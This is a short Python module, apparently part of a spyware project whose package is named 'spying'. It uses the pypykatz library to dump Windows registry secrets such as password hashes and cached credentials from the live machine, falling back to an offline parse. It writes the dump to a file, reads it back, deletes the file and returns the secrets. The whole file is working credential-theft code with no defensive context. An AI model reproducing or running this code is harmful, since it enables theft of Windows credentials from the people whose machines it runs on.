from pypykatz.registry.live_parser import LiveRegistry
from pypykatz.registry.offline_parser import OffineRegistry
from spying.consts import ROOT_DIRECTORY
import os


def get_secrets() -> str:
    lr = None
    try:
        lr = LiveRegistry.go_live()
    except Exception as e:
        try:
            lr = OffineRegistry.from_live_system()
        except Exception as e:
            raise Exception('Registry parsing failed!')
    if lr is not None:
        path = f"{ROOT_DIRECTORY}\\file.txt"
        lr.to_file(path)
        with open(path, "rt") as f:
            result = f.read()
        os.remove(path)
        return result
    else:
        raise Exception('Registry parsing failed!')

